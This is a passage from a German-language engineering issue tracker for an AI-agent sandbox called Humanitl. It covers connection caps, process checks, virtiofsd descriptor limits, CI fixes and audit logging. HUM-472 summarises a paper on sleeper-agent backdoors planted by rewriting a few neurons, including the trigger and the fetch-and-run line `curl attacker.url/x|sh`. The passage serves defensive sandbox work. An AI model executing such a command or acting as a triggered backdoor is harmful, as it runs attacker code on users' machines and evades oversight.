`$HOME`, `/run`), werden im Gast zu leeren, nur lesbaren Verzeichnissen. Ein
Agent, der in `/tmp` oder sein Home schreibt, scheitert. `mounts.extra_rw` ist
im Gast ebenfalls nur lesbar.

### Spezifikation
1. Der Gastplan nennt die tmpfs-Zeilen; der Shim hängt sie im Gast als tmpfs
   ein, vor dem Start des Agenten, mit Größe und Rechten wie unter bwrap.
2. `socket_walk` des Gastplans umfasst diese Orte, damit `single_socket` sie
   durchsucht.
3. `mounts.extra_rw` unter der Kernel-Stufe: entweder über `/work` erreichbar
   oder mit eigener Diagnose abgelehnt, nie stillschweigend nur lesbar.

### Tests
- KVM: der Agent schreibt nach `/tmp` und `$HOME`; die Mounttabelle des Gasts
  passt zum Plan.
- Mutationsbeweis: ohne das Einhängen färbt der Test rot.

### Akzeptanzkriterien
1. Ein Agent unter `qemu` hat dieselben beschreibbaren Orte wie unter bwrap.
2. Vor HUM-449 gelandet.

---

## HUM-467 · Kernel level: a cap on door connections per session

### Kontext
Aus dem Review von HUM-444 (Kandidat). `serve_door` startet je Verbindung des
Gasts zwei Fäden und hält vier Deskriptoren. Ein Gast mit Root kann beliebig
viele Verbindungen öffnen und Fäden und Deskriptoren des Daemons erschöpfen,
was auch andere Sitzungen trifft.

### Spezifikation
1. Eine feste Obergrenze gleichzeitiger Verbindungen je Sitzung (etwa 64);
   darüber wird die neue Verbindung sofort geschlossen und einmal je Sitzung
   ins Audit geschrieben.
2. Optional ein gemeinsames Limit über alle Sitzungen.

### Tests
- Unit: die 65. Verbindung wird geschlossen, die übrigen arbeiten weiter.
- Mutationsbeweis: ohne Grenze färbt der Test rot.

### Akzeptanzkriterien
1. Kein Gast kann die Fäden oder Deskriptoren des Daemons unbegrenzt binden.

### Stand nach der Umsetzung (2026-11-14)

**Obergrenze.** `serve_door` (`qemu/session.rs`) zählt die weitergereichten Verbindungen einer Sitzung (`DoorSlots`, `MAX_DOOR_CONNECTIONS = 64`). Ein Platz (`DoorSlot`) lebt, bis beide Fäden von `splice_holding` ihre Deskriptoren geschlossen haben; erst dann nimmt die Tür wieder eine an. Eine Verbindung über der Grenze geht sofort zu, ungelesen und ohne Faden, und erreicht den Proxy nie. Je Sitzung bindet die Tür so höchstens 128 Fäden und 256 Deskriptoren. Vor der Bereitschaft bleibt alles wie in HUM-471: nur die Zeile, ohne Faden, nichts an den Proxy.

**Wohin der Vermerk geht.** Aus dem Sandbox-Crate führt heute kein Weg ins Audit-Log: `humanitld/src/audit_sink.rs` hört nur den Flow-Strom und nennt `isolation.check` ausdrücklich als ohne Quelle, und die Warnungen des Plans (`LaunchPlan::warnings`) gehen nur beim Start in den Ereignisstrom. Der Vermerk landet deshalb einmal je Sitzung in der `Admission` der Sitzung (`note_door`, ein `OnceLock`), die der Faden zum Gast und die Host-Prüfung schon teilen und die jetzt auch die Tür bekommt, und `isolation_check` hängt ihn an den Beleg von `single_socket` jeder späteren Prüfung (`name_the_door`), so wie `name_the_link` den Stand des Wegs zum Gast. Am Ergebnis ändert er nichts: Die Verbindung erreichte nichts.

**Tests und Mutationsbeweise.** `the_connection_above_the_cap_is_closed_and_the_others_keep_working`: 64 Verbindungen erreichen den Proxy, die 65. und 66. gehen sofort zu, ohne ihn zu erreichen, der Vermerk steht einmal, alle 64 tragen danach noch Daten in beide Richtungen, und nach dem Schließen einer kommt eine neue wieder durch. Ohne Grenze (`take` immer `Some`) bleibt die 65. offen und der Test färbt rot; ohne Freigabe des Platzes (`Drop` von `DoorSlot` leer) kommt die neue nie durch und der Test färbt rot.

**Offen.** Punkt 2, ein gemeinsames Limit über alle Sitzungen, ist nicht gebaut: Ein solches Limit ließe einen Gast die Türen der anderen Sitzungen sperren und braucht eine Entscheidung, wie es verteilt wird. Kandidat: ein globales Limit mit fairer Teilung je Sitzung. Kandidat: Ereignisse der Sandbox (diesen Vermerk, die Isolationsprüfung) ins Audit-Log bringen, über einen Kanal vom Backend in den Ereignisstrom der Sitzung. Kandidat aus dem Review: `serve_door` dreht sich ohne Pause, wenn `accept` dauerhaft scheitert (etwa `EMFILE`); eine kurze Pause nach einem Fehler.

---

## HUM-468 · Kernel level: the host check knows the programs of the unit

### Kontext
Aus dem Review von HUM-444 (Kandidat). Die Host-Prüfung prüft Netz, Geräte,
Deskriptoren und Sockets, aber nicht, welche Programme in der Unit laufen. Ein
unerwarteter Prozess fiele nur auf, wenn er ein Netzgerät oder ein Gerät
hält.

### Spezifikation
1. Jeder Prozess der Unit ist eines von: `sh` des Skripts, `bwrap`, dem Shim,
   den vier Helfern (kanonische Pfade aus `Resolved`); alles andere ist ein
   Fund unter `SANDBOX_047`.

### Tests
- Unit über eine Fixture von `/proc`; KVM: grüne Sitzung bleibt grün.
- Mutationsbeweis: ein zusätzlicher `sleep` in der Unit färbt die Prüfung rot.

### Akzeptanzkriterien
1. Ein unbekanntes Programm in der Unit beendet die Sitzung mit `SANDBOX_047`.

### Stand nach der Umsetzung (2026-11-14)
Die Host-Prüfung vergleicht `/proc/<pid>/exe` jedes Prozesses der Unit mit
den Programmen, die das Skript startet: `/bin/sh` (`SCRIPT_SHELL`),
bubblewrap, virtiofsd, vhost-device-vsock und QEMU, je unter dem
eingestellten Pfad und unter seinem aufgelösten Ziel. Beides gilt, weil der
Kernel für einen Prozess, der erst im Gefängnis startete, den Pfad im
Gefängnis zeigt; ein Programm außerhalb von `/usr` bindet die Zeile unter
dem eingestellten Pfad dorthin, auch wenn er auf dem Host ein Verweis ist
(nachgemessen mit bwrap: `/proc/<pid>/exe` zeigt den Zielpfad des Binds).
Ein anderes Programm, ein gelöschtes (` (deleted)`) oder ein unlesbares ist
ein Fund, der Fund des fremden Programms an `single_socket` mit
`SANDBOX_047`. Abweichung von der Spezifikation: Der Shim steht nicht auf der
Liste. Er ersetzt sich mit `--fds-then-exec` durch die Shell, lange bevor der
Gast berichtet; ein Shim, der zur Zeit der Prüfung noch läuft, ist eine
Abweichung und wird deshalb gefunden. Tests: `every_process_of_the_unit_runs_one_of_its_programs`
liest eine Nachbildung von `/proc` über denselben Weg wie die Prüfung
(`read_process`, dann `judge`); `an_extra_sleep_in_the_unit_turns_the_host_check_red`
startet über einen Testeingriff (`TestMachine::extra_process`) ein
`sleep 600` neben der Maschine in der Unit. Mutationsbeweis: Ohne den
Vergleich der Programme bestehen in diesem KVM-Test alle drei Garantien, die
Sitzung wird zugelassen; mit ihm endet sie mit `SANDBOX_047`, und der Agent
startet nie. Alle KVM-Tests bleiben grün, mit dem Gastkernel der CI und dem
lokalen.

Nicht umgesetzt, Kandidat für ein eigenes Issue: feste Anzahlen je Programm
(genau so viele Shells, bwrap- und virtiofsd-Prozesse wie das Skript
startet). Wie viele Prozesse eine Shell für `( … ) &` forkt und ob bwrap
mit `--unshare-pid` einen eigenen Init behält, hängt von Shell und Fassung
ab; eine feste Zahl wäre nicht robust. Die Anzahl des Emulators und des
vsock-Geräts (genau einer) und je geprüftem Ordner genau ein virtiofsd
prüft die Host-Prüfung schon.

Aus dem Review (Codex, blocking): Die Prüfung las die PIDs der Unit nur einmal; ein Prozess, den ein übernommener Helfer kurz danach startet, blieb ungeprüft. Jetzt liest `settle` die cgroup nach, bis keine neue PID mehr auftaucht (höchstens fünf Runden, sonst ein Fund), Unit-Test mit Mutationsbeweis. Was nach der Zulassung startet, sieht die einmalige Prüfung nicht; das steht als Restrisiko in K-33. Kandidat: Programme der Unit über `ExecPaths=`/`NoExecPaths=` des Dienstverwalters erzwingen statt nur prüfen.

---

## HUM-469 · Kernel level: a descriptor limit for the virtiofsd processes

### Kontext
Gefunden in HUM-445: Ein Walk über die Wurzel des Gasts ließ den virtiofsd der
Wurzel rund 520 000 Deskriptoren öffnen (`No more file descriptors available
to the guest (0 of 523678)`), danach `ENFILE` im Gast. Ein Gast mit Root kann
so Kernel-Speicher des Hosts binden und die Wurzel für sich selbst
unbrauchbar machen.

### Spezifikation
1. Die virtiofsd-Prozesse bekommen eine feste Grenze der Deskriptoren
   (`--rlimit-nofile` oder `LimitNOFILE` der Unit), dazu eine Cache-Einstellung,
   die Inodes nicht unbegrenzt offen hält, soweit virtiofsd 1.13 sie kennt.
2. Erreicht der Gast die Grenze, bleibt die Sitzung bedienbar oder endet mit
   einer Diagnose; der Host bleibt unberührt.

### Tests
- KVM: ein Walk über die ganze Wurzel im Gast; die Zahl der Deskriptoren des
  virtiofsd bleibt unter der Grenze.
- Mutationsbeweis: ohne Grenze steigt die Zahl darüber.

### Akzeptanzkriterien
1. Kein Gast kann einen virtiofsd über eine feste Zahl Deskriptoren treiben.
2. Vor HUM-449 gelandet.

## HUM-470 · Kernel level: two intermittent failures on CI

### Kontext
Gefunden beim Landen von HUM-445: Im CI-Lauf 43567140980 fiel
`qemu::kvm_tests::the_shim_as_init_locks_modules_and_the_door_answers_after_the_filter`
mit `no CHECK bridge_listening`, der Bericht des Shims enthielt also keine
einzige Prüfzeile. Lokal ist der Test grün, auch mit dem Gastkernel der CI
(6.12.115 cloud), und im nächsten Lauf (43571942098) war er auf demselben Stand
grün. Ebenso `esc-2/unplanned_mount` im Job escape-tests-qemu: in den Läufen
43567140980 und 43571942098 mit Exit 3 abgewiesen, aber nicht mit
`SANDBOX_049`, im Lauf 43573771650 auf fast demselben Stand grün; die Meldung
nennt seit HUM-445 die letzte Zeile von escape-launch. Ein Test der Kernel-Stufe, der nur manchmal rot ist, verdeckt einen
echten Fehler genauso wie einer, der zufällig grün ist.

### Spezifikation
1. Ursache aus der Konsole des Gasts bestimmen (der Schritt „Guest console
   after a failure" schreibt seit HUM-445 die ganze Ausgabe jedes gefallenen
   Tests in eine Annotation): Zeitgrenze des Berichts, Start von virtiofsd
   1.13, Last des Runners.
2. Beheben, nicht wiederholen: kein Retry im Test oder in der CI.

### Tests
- Die Jobs kvm-tests und escape-tests-qemu zehnmal hintereinander auf demselben
  Commit grün.

### Akzeptanzkriterien
1. Ursache benannt und behoben, oder als Eigenschaft des Runners begründet und
   mit einer Diagnose versehen, die sie im Lauf eindeutig nennt.

### Stand nach der Umsetzung (2026-11-14)
`esc-2/unplanned_mount` ist behoben (die Diagnose des Gasts bleibt stehen,
wenn die Unit vor der Host-Prüfung endet; KVM-Test erzwingt die Reihenfolge).
Der kvm-Test ohne CHECK-Zeile ist nicht behoben: Die vermutete Ursache (eine
nach 5 s aufgegebene vsock-Anfrage) ist gemessen widerlegt, der Fall lokal
einmal reproduziert und jetzt richtig gemeldet („the sandbox ended after 32.1s
of 60s … before its report"). Er geht als HUM-471 weiter, ebenso der Nachweis
der zehn grünen Läufe.

## HUM-471 · Kernel level: the guest that never gets the host's connections

### Kontext
Aus HUM-470. In der CI (Lauf 43580902135) und einmal lokal mit dem Gastkernel
der CI fiel `qemu::kvm_tests::a_session_starts_through_the_adapter_with_a_green_host_check`:
`no CHECK line from the shim; the sandbox ended after 32.1s of 60s (exit
status: 0) before its report; host: the unit … has ended`. Der Gast wartete
also `REPORT_WAIT` (30 s) auf die zwei Verbindungen des Hosts und schaltete
sauber ab; der Host bekam in dieser Zeit kein `OK` von vhost-device-vsock.
Beide Male lief der Test direkt nach
`a_module_that_cannot_load_powers_the_guest_off_before_the_agent`. Gemessen ist:
Das Gerät beantwortet jedes `CONNECT` binnen Millisekunden, eine Absage kommt
sofort, solange der Gast nicht lauscht. Vermutlich ein Start-Wettlauf zwischen
Gerät und QEMU oder die Probe des vsock-Treibers im Gast; ohne Konsole des
Gasts ist das nicht lesbar. Verwandt: `no CHECK bridge_listening` im
`test_vm`-Pfad (Lauf 43567140980).

### Spezifikation
1. Im Fehlerfall die Konsole des Gasts auch im Adapterpfad sichern (nur für
   Tests und CI, nie im gegateten Lauf mit Konsole), und den Fall damit
   bestimmen.
2. Ursache beheben, nicht wiederholen: kein Retry im Test oder in der CI.
3. Bericht und Steuerkanal per Hello-Zeile mit Rolle kennzeichnen statt per
   Reihenfolge der Verbindungen, falls die Ursache darin liegt.

### Tests
- Die Jobs kvm-tests und escape-tests-qemu zehnmal hintereinander auf demselben
  Commit grün.
- Ein KVM-Test, der den gefundenen Wettlauf erzwingt; Mutationsbeweis.

### Akzeptanzkriterien
1. Ursache benannt und behoben, oder als Eigenschaft des Runners begründet und
   mit einer Diagnose versehen, die sie im Lauf eindeutig nennt.
2. Vor HUM-449 gelandet.

### Stand nach der Umsetzung (2026-11-14)
Ursache gefunden und behoben. vhost-device-vsock 0.3.0 hält für immer an,
wenn ein `CONNECT` des Hosts eintrifft, nachdem QEMU dem Gerät den Speicher
des Gasts gegeben hat (`SET_MEM_TABLE`), aber bevor dessen Warteschlangen
bereit sind: `process_tx`/`process_rx` scheitern mit `IterateQueue`, der
Fehler beendet den Ereignisfaden von vhost-user-backend 0.20, der Prozess
lebt weiter, und kein späteres `CONNECT` bekommt eine Antwort. Das Fenster
liegt im Start des Treibers im Gast (Laden von `vmw_vsock_virtio_transport`
durch den Shim); der Host fragte alle 100 ms und traf es selten (lokal in 68
Läufen nie, in der CI langsamer und öfter). Nachgewiesen mit einem
vhost-user-Frontend in Python gegen das echte Gerät (CONNECT vor bereiten
Warteschlangen: auch danach wird nichts mehr zugestellt; in umgekehrter
Reihenfolge sofort) und mit dem KVM-Test unten. Derselbe Fehler erklärt
vermutlich das `no CHECK bridge_listening` des `test_vm`-Pfads (Lauf
43567140980); der Pfad wartet jetzt ebenso.

Behoben: Der Shim lauscht am Berichts-Port und meldet dann mit einer festen
Zeile auf einer eigenen Verbindung zur Tür, dass er bereit ist
(`HUMANITL-GUEST-READY`); eine Verbindung des Gasts gibt es erst, wenn die
Warteschlangen laufen. Der Host stellt sein erstes `CONNECT` erst danach.
Bis zur Zeile reicht die Tür nichts an den Proxy. Fehlt der Bericht, nennt
der Befund jetzt den Stand der Verbindung (`vsock link: …`), schon im
gegateten Lauf. Die Rollen-Kennzeichnung per Hello-Zeile (Punkt 3) war nicht
nötig: Die Reihenfolge war nicht die Ursache. Die Konsole des Gasts läuft im
Adapterpfad mit `HUMANITL_TEST_VM_CONSOLE=1` mit (nur Tests, Schritt „Guest
console after a failure").

Tests: KVM `a_connect_while_the_vsock_device_starts_never_silences_it` hält
die Einrichtung des Geräts mit einem Zwischenstück am vhost-user-Socket drei
Sekunden an; Mutationsbeweis: ohne das Warten auf die Bereitschaft keine
Verbindung, „vsock link: … the report connection has no answer yet".
Offen: der Nachweis der zehn grünen Läufe von kvm-tests und
escape-tests-qemu in der CI.

Nachweis der zehn Läufe, Entscheidung des Owners vom 2026-11-14: Statt
desselben Commits zählen die CI-Läufe der folgenden Issues, hintereinander.
Ein Lauf zählt nur, wenn kvm-tests und escape-tests-qemu beide gelaufen
(nicht nach der Pfadregel übersprungen) und grün sind; ein roter KVM-Job
setzt die Zählung auf null. Die Lauf-IDs gehen in die Zulassung (HUM-449),
die bis zum zehnten wartet. Bisher: 43624997550 (HUM-471), 43630993303
(HUM-476).

## HUM-472 · Website: the model as the attacker, with sources

### Kontext
Wunsch des Owners (2026-11-14). Microsoft Research und das Microsoft AI Red
Team haben gezeigt, dass das Umschreiben von weniger als zehn ruhenden Neuronen
ein offenes Modell zum Schläfer macht, der jede Evaluation besteht und auf einen
Auslöser hin `curl attacker.url/x|sh` ausführt (Zeng, Severi, Bullwinkel,
Horvitz, Papailiopoulos, „Lazare, veni foras: Reprogramming Dormant Neurons to
Backdoor AI Agents“, 2026). Das Paper sagt selbst: „the scale of the attack is
bounded by the agent's permissions, not the size of the edit“, und empfiehlt
Anwendern, Rechte zu begrenzen, Befehle, Dateien und Netzaufrufe zu
protokollieren und vor Befehlen, Änderungen und Daten nach außen eine Freigabe
zu verlangen. Genau das ist Humanitl; ein guter, belegter Aufhänger für das
Risiko, das wir angehen.

### Spezifikation
1. Startseite: ein kurzer Kasten vor der Sektion „Vier Versuche“ (de + en),
   im Wortlaut des vom Owner bestätigten Entwurfs:
   - Überschrift „Wenn das Modell selbst der Angreifer ist“ / „When the model
     itself is the attacker“.
   - Sieben Neuronen, jede Prüfung bestanden, `2027-01-01` im Terminal,
     `curl attacker.url/x|sh`; Fazit der Autoren: die Rechte des Agenten
     entscheiden über den Schaden, nicht der Eingriff ins Modell.
   - Was Humanitl daraus macht: der Download aus dem Beispiel hält am Proxy,
     bis der Nutzer freigibt; der Agent sieht nur sein Projekt; jede
     Verbindung wird protokolliert. Ausdrücklich: Humanitl erkennt keine
     manipulierten Modelle, es nimmt ihnen ohne Zustimmung die Wirkung.
   - Fußnote mit Quelle.
2. Sicherheitsseite, Kapitel „Was offen bleibt“ (`#grenzen`): ein Absatz zum
   manipulierten Modell als Gegner mit denselben Quellen, über die vorhandene
   Quellen-Komponente (`Src`), dazu die ehrliche Einordnung: setzt
   Schreibzugriff auf die Gewichte voraus (manipulierter Checkpoint auf einem
   öffentlichen Hub, Insider), laut Microsoft bisher nicht in freier Wildbahn
   beobachtet; Humanitl erkennt die Manipulation nicht, begrenzt die Wirkung.
3. Quellen, nur diese: das Paper (PDF
   https://github.com/anadim/anadim.github.io/blob/master/papers/Lazarus.pdf),
   der Code (https://github.com/microsoft/lazarus, sobald öffentlich), der Blog von Microsoft Threat Intelligence vom 10.11.2026
   (https://www.microsoft.com/en-us/security/blog/2026/11/10/detecting-sleeper-agents-hiding-in-ai-model-neurons/,
   Beleg für „bisher nicht beobachtet"), als Zweitquelle InfoWorld
   vom 11.11.2026
   (https://www.infoworld.com/article/4247378/rewriting-less-than-10-neurons-in-an-llm-can-turn-it-into-a-sleeper-backdoor-2.html).
   Jede Zahl und jedes Zitat aus dem Paper; keine Quelle, deren URL nicht
   geprüft ist.

### Tests
- `website` baut; Link- und Übersetzungsprüfung (`scripts/check-links.mjs`,
  `scripts/check-translations.mjs`) grün.
- Screenshot beider Stellen (hell und dunkel, Desktop und Telefonbreite) vor
  dem Commit, an den Owner.

### Akzeptanzkriterien
1. Beide Stellen in de und en, jede Aussage über das Paper mit Quelle.
2. Keine Aussage, Humanitl erkenne Backdoors; keine Aussage, der Angriff sei
   schon im Einsatz beobachtet.

## HUM-475 · Website: German copy of the home and security pages

### Kontext
Rückmeldung des Owners vom 2026-11-14: Die deutschen Texte auf der
Startseite und der Sicherheitsseite sind teilweise sehr holprig, auch
grammatikalisch. Viele Sätze lesen sich wie wörtlich aus dem Englischen
übertragen.

### Spezifikation
1. Jeder deutsche Text der Startseite und der Sicherheitsseite
   (`website/src/i18n/locales/de.ts`, Schlüssel `home` und `security`, dazu
   gemeinsame Teile, die auf beiden Seiten stehen) wird geprüft und, wo
   nötig, neu formuliert: korrekte Grammatik und Zeichensetzung, natürlicher
   deutscher Satzbau statt Übersetzungsdeutsch, kurze Sätze statt
   Bandwurmsätzen, durchgehend „du", ein Begriff für eine Sache.
2. Der Inhalt bleibt: keine Aussage wird stärker oder schwächer, keine Zahl,
   kein Code, kein Verweis ändert sich. Fachbegriffe, Bezeichner, Befehle
   und Codes bleiben exakt.
3. Die englischen Texte bleiben unverändert, außer ein Fehler dort zeigt
   sich beim Abgleich.

### Tests
- `website` baut; Link- und Übersetzungsprüfung grün.
- Vorher-Nachher-Liste der geänderten Sätze und Screenshots für den Owner
  vor dem Commit.

### Akzeptanzkriterien
1. Kein grammatikalischer Fehler mehr in den deutschen Texten beider Seiten.
2. Jede Sicherheitsaussage gleich stark wie vorher, geprüft gegen
   `docs/SECURITY.md`.

## HUM-476 · Kernel level: the guest's file cache back on, but bounded

### Kontext
Aus HUM-469. Damit die feste Grenze von 65 536 Deskriptoren für virtiofsd
hält, laufen beide virtiofsd mit `--cache never`: Mit dem Standard-Cache
behält der Gast je Inode einen Dentry, bis der Speicher knapp wird, und
virtiofsd hält je Inode einen Deskriptor; ein einfaches `ls -lR` erreichte die
Grenze (Lauf endete nach 71 470 Einträgen mit `ENFILE`). Der Preis, gemessen
in HUM-469 (`--cache never` gegen `auto`): `cp -r /usr/include` 20 s gegen
5 s, `git add` 27,6 s gegen 11 s, `grep -r` 3,3 s gegen 1,7 s, `git status`
1,7 s gegen 0,3 s, `ls -lR /usr/share/doc` 33 s gegen 2 s. Entscheidung des
Owners vom 2026-11-14: jetzt sicher landen, die Geschwindigkeit vor der
Zulassung (HUM-449) zurückholen.

### Spezifikation
1. Der Cache des Gasts wird wieder eingeschaltet (`--cache auto` oder
   `metadata`), aber die Zahl der Inodes, die der Gast hält, bleibt
   begrenzt, deutlich unter der Grenze der Deskriptoren. Kandidaten, zu
   messen: der Shim gibt im Gast Dentries und Inodes frei, sobald ihre Zahl
   eine Schwelle überschreitet (`/proc/sys/fs/dentry-state`,
   `vm.drop_caches=2`, `vfs_cache_pressure`), oder eine Option von virtiofsd
   1.13, die geöffnete Inodes begrenzt.
2. Die Grenze von 65 536 Deskriptoren bleibt, und der KVM-Test aus HUM-469
   bleibt grün; ein Walk über die ganze Wurzel endet nicht mehr mit
   `ENFILE`.

### Tests
- Dieselben Messungen wie in HUM-469, Ziel: höchstens das Doppelte der Zeit
  mit `auto`.
- KVM-Test aus HUM-469 grün, dazu ein Walk über die Wurzel ohne `ENFILE`.

### Akzeptanzkriterien
1. Kein Gast treibt einen virtiofsd über die feste Grenze.
2. Die Messwerte liegen höchstens beim Doppelten von `auto`.
3. Vor HUM-449 gelandet.

### Stand nach der Umsetzung (2026-11-14)
Beide virtiofsd laufen mit `--cache auto`, und PID 1 im Gast hält den Cache
begrenzt (`daemon/bin/humanitl-shim/src/guest_cache.rs`): Alle 100 ms liest es
die unbenutzten Dentries und Inodes (`/proc/sys/fs/dentry-state` und
`inode-state`, je das zweite Feld), und über 32 768 schreibt es `2` nach
`/proc/sys/vm/drop_caches`. Der Gastkernel verwirft dann alles Unbenutzte,
schickt je Inode `FORGET`, und virtiofsd schließt den Deskriptor. Die drei
Dateien öffnet der Shim beim Start, bevor es den Agenten gibt, mit
`O_CLOEXEC`; nur PID 1 hält sie (das Kind schließt jeden geerbten Deskriptor,
PID 1 ist nicht dumpable), und der Faden startet erst nach dem Fork und nach
dem Filter von PID 1. Der Bericht trägt `CACHE bound 32768` oder
`CACHE off <Grund>`; kein Leser zählt die Zeile. `LimitNOFILE=65536` bleibt
die Garantie, die Begrenzung ist Komfort des Gasts.

Kandidaten: virtiofsd 1.14.0 (Debian) kennt keine Option, die Inodes
begrenzt; `--inode-file-handles` fällt ohne `CAP_DAC_READ_SEARCH` auf
Deskriptoren zurück. `vfs_cache_pressure=10000` (als Root im Gast gesetzt)
wirkt nur bei knappem Speicher und änderte nichts: `ls -lR` endete mit
`ENFILE`, danach startete kein Programm mehr. `--cache metadata` mit der
Begrenzung maß wie `auto` (`ls -lR` 3,3 s, `git add` 11,3 s); `auto` bleibt,
weil Änderungen des Nutzers unter `/work` nach einer Sekunde sichtbar werden.

Messung mit `qemu::kvm_tests::the_workloads_of_hum_469_measured` (von Hand,
`--ignored`), Gastkernel der CI, 512 MiB, 1 CPU, Wurzel mit dem `/usr` des
Hosts; Sekunden, „max. FD" ist der Höchststand des Wurzeldienstes:

| Last | `never` | `auto` | `auto` + Begrenzung (2 Läufe) |
|---|---|---|---|
| `cp -r /usr/include /work/inc` | 16,3 | 5,4 | 6,5 / 5,7 |
| `git add -A` (13 475 Dateien) | 28,8 | 12,5 | 10,5 / 11,2 |
| `grep -r` (mit `.git`) | 7,1 | 3,7 | 3,3 / 3,3 |
| `git status` | 1,53 | 0,39 | 0,39 / 0,36 |
| `git status`, zweiter Lauf | 1,42 | 0,28 | 0,25 / 0,23 |
| `ls -lR /usr/share/doc` (81 000) | 28,4 | 2,2, `ENFILE` 2 467-mal | 4,0 / 3,2 |
| `find / -xdev -size +0` | 67,0 | startet nicht (`ENFILE`) | 31,8 / 29,4 |
| max. FD | 111 | 64 947 | 36 588 / 37 566 |

Wo `auto` fertig wird, liegt die Begrenzung bei höchstens dem 1,2-Fachen
(`cp -r`), sonst gleich oder schneller. Für `ls -lR` und den Walk gibt es
keinen vollständigen Vergleich mit `auto`, das mit `ENFILE` abbricht oder gar
nicht startet; dort steht die Begrenzung bei einem Siebtel bis der Hälfte der
Zeit von `never` (gegen das abgebrochene `auto`: höchstens das 1,8-Fache).
Die Begrenzung ist ein Auslöser alle 100 ms, keine Obergrenze: Verzeichnisse,
die gecachte Kinder halten, zählen nicht als unbenutzt. KVM-Test aus HUM-469 erweitert: Der
Walk sieht jeden Eintrag an (`-size +0`) und zählt `ENFILE`; mit der
Begrenzung 684 687 Einträge, 0 `ENFILE`, nach dem Walk 18 897 Deskriptoren,
die Probe als Root hält 30 074 Dateien und wird an der Grenze abgewiesen
(höchstens 64 947). Mutationsbeweis: Schwelle `u64::MAX`, der Walk endet
nach 62 524 Einträgen mit 60 `ENFILE`, der Test wird rot.

Offen, als Kandidat für ein eigenes Issue (erledigt in HUM-484): `--allow-mmap` und die
Untergrenze 6.6 des Gastkernels (`prerequisites.rs`) stammen aus der Zeit von
`--cache never` und wirken unter `auto` nicht mehr; beide zusammen prüfen und
entfernen. Ebenso: auch die Zahl der gehaltenen Inodes (`inode-state`
erstes Feld) begrenzen, damit Verzeichnisketten nicht unbemerkt bleiben;
ein Test, der die keep-Liste von PID 1 und das `drop` der drei
`/proc`-Deskriptoren im Kind bewacht (beides erledigt in HUM-483).

---

## HUM-477 · Sandbox events reach the audit log

### Kontext
Aus HUM-467. Der Vermerk der Tür (Verbindung über der Obergrenze) und das
Ergebnis der Isolationsprüfung stehen nur in der Zulassung und in der
evidence der Prüfung; aus dem Sandbox-Crate führt kein Weg ins Audit-Log
(`bin/humanitld/src/audit_sink.rs` hört nur den Flow-Strom).

### Spezifikation
1. Ein Kanal vom Backend in den Ereignisstrom der Sitzung, über den das
   Backend Ereignisse meldet; der Daemon schreibt sie ins Audit-Log.
2. Erste Nutzer: der Vermerk der Tür (einmal je Sitzung) und das Ergebnis
   der Host-Prüfung der Kernel-Stufe.

### Tests
- Integration: eine Sitzung, deren Gast die Obergrenze überschreitet, hat
  genau einen Eintrag im Audit-Log.

### Akzeptanzkriterien
1. Der Vermerk der Tür steht im Audit-Log, nicht nur in der evidence.

### Stand nach der Umsetzung (2026-11-18)

**Der Kanal.** `humanitl_core::SandboxNoticeSink` trägt Meldungen des Backends (`SandboxNotice`) als `FlowEvent::Sandbox` weiter. Der Daemon baut ihn in `sandbox_notices` (`humanitld/src/main.rs`) und gibt ihn dem Sandbox-Dienst (`SandboxPorts::with_sandbox_notices`, verdrahtet in `sandbox_ports`); jeder Plan trägt ihn in `LaunchOptions::notices` zum Backend, die Kernel-Stufe legt ihn in die `Admission` des Starts, die Tür und Prüfung schon teilen. `sandbox_notices` schreibt jede Meldung zuerst direkt über `AuditHandle::record` ins Audit-Log und legt sie danach in den Ereignisstrom. Der Sink des Audit-Logs (`audit_sink.rs`) übergeht sie im Strom: Sein Empfänger am begrenzten Rundfunk kann zurückfallen, und der Vermerk der Tür kommt nur einmal (Befund aus dem Review). `Subscribe` lässt sie aus, auf der Leitung ändert sich nichts.

**Die ersten Nutzer.** Die Tür meldet `DoorCapped { cap: 64 }`, nur wenn `note_door` die erste Verbindung über der Grenze festhielt; im Log steht die neue Art `sandbox.door_capped`. „Einmal" heißt einmal je Start der Sandbox: `Admission` und `OnceLock` entstehen mit jedem Plan, und ein Daemon, der die Sandbox erneut startet, schreibt unter derselben Sitzungskennung des Audit-Logs einen weiteren Record. Jede Prüfung der Kernel-Stufe meldet nach der Host-Prüfung `IsolationChecked` mit Name und Ergebnis je Garantie, ohne Beleg und Befund; im Log steht die bestehende Art `isolation.check`, die bis jetzt keine Quelle hatte. Die anderen Backends melden nichts.

**Tests und Mutationsbeweise.** `a_session_whose_guest_exceeds_the_cap_has_exactly_one_audit_entry` (`humanitld`, auf der Ebene des Ports): Eine Attrappe des Backends, die sich an der Tür verhält wie die Kernel-Stufe, meldet über den Kanal, den `sandbox_ports` dem Dienst gibt; nach 67 Verbindungen und einem Schwall von 32 Ereignissen in einen Rundfunk für 8, bevor der Sink liest, steht genau ein `sandbox.door_capped` mit der Sitzung im Log, dazu ein `isolation.check`, und die Meldung steht auch im Strom. `the_connection_above_the_cap_is_closed_and_the_others_keep_working` (Sandbox-Crate) prüft, dass die echte Tür bei zwei Verbindungen über der Grenze genau eine Meldung in den Kanal gibt. `the_sandbox_notices_reach_the_launch_options` (`humanitl-ipc`) prüft, dass der Kanal aus den Anschlüssen in den Optionen jedes Plans steht, die `launch_with` dem Backend gibt. `the_notice_of_a_check_names_each_guarantee_and_nothing_else` hält fest, dass kein Beleg in die Meldung gerät, `a_sandbox_notice_has_no_wire_form`, dass sie nicht auf die Leitung geht. Rot färbt jeweils der zugehörige Test: der Weg nur über den Strom (der alte Bau), ohne `record` in `sandbox_notices`, ohne `with_sandbox_notices` in `sandbox_ports`, ohne den Kanal in den Plan-Optionen, ohne die Meldung an der Tür, mit einer Meldung für jede Verbindung über der Grenze. Ein Test mit echtem Gast (KVM) ist nicht dazugekommen: Er bräuchte 65 Verbindungen aus dem Gast über die Tür und prüfte dieselben Stellen wie die Tests oben.

---

## HUM-478 · Kernel level: the door pauses after an `accept` error

### Kontext
Aus dem Review von HUM-467. `serve_door` geht nach einem Fehler von
`accept` sofort zurück zu `poll`; scheitert `accept` dauerhaft (etwa
`EMFILE`), dreht der Faden ohne Pause.

### Spezifikation
1. Nach einem Fehler von `accept` eine kurze Pause (etwa 50 ms), die
   Lebensleine bleibt dabei beachtet.

### Tests
- Unit: ein Lauscher, dessen `accept` scheitert, kostet keine volle CPU.

### Akzeptanzkriterien
1. Ein dauerhafter Fehler von `accept` lässt den Faden nicht drehen.

### Stand nach der Umsetzung (2026-11-14)
`serve_door` wartet nach jedem Fehler von `accept` außer `Interrupted`
`ACCEPT_PAUSE` (50 ms) auf die Lebensleine und endet, wenn sie zugeht.
